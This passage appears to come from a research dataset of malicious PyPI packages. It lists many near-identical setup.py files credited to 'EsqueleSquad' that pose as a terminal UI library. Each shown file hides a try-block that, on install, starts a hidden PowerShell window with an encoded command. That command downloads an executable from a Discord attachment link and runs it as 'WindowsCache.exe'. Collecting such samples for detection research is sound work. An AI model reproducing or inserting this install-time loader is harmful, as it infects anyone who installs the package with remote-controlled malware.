3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libtoolrandomrand-v8.83",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libtoolrandomrand',\n    packages = ['modlib'],\n    version = '1.56',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-liburlosintstudy-v8.80",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'liburlosintstudy',\n    packages = ['modlib'],\n    version = '8.49',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-liburlpywpost-v1.1",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'liburlpywpost',\n    packages = ['modlib'],\n    version = '2.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-liburlstringping-v3.86",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'liburlstringping',\n    packages = ['modlib'],\n    version = '5.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libvercpuvm-v6.94",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libvercpuvm',\n    packages = ['modlib'],\n    version = '2.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libverpullpong-v9.71",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libverpullpong',\n    packages = ['modlib'],\n    version = '10.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libvisasupergrand-v6.90",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libvisasupergrand',\n    packages = ['modlib'],\n    version = '7.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libvisaurlgui-v9.72",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libvisaurlgui',\n    packages = ['modlib'],\n    version = '3.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-adrandget-v2.67",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-adrandget',\n    packages = ['modlib'],\n    version = '10.62',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-cpuintre-v9.14",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-cpuintre',\n    packages = ['modlib'],\n    version = '7.74',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-replacecraftad-v4.53",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-replacecraftad',\n    packages = ['modlib'],\n    version = '7.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-virtualhttppy-v1.73",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-virtualhttppy',\n    packages = ['modlib'],\n    version = '8.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfadpullint-v8.49",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfadpullint',\n    packages = ['modlib'],\n    version = '10.14',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfcandystudystudy-v9.14",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcandystudystudy',\n    packages = ['modlib'],\n    version = '1.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT 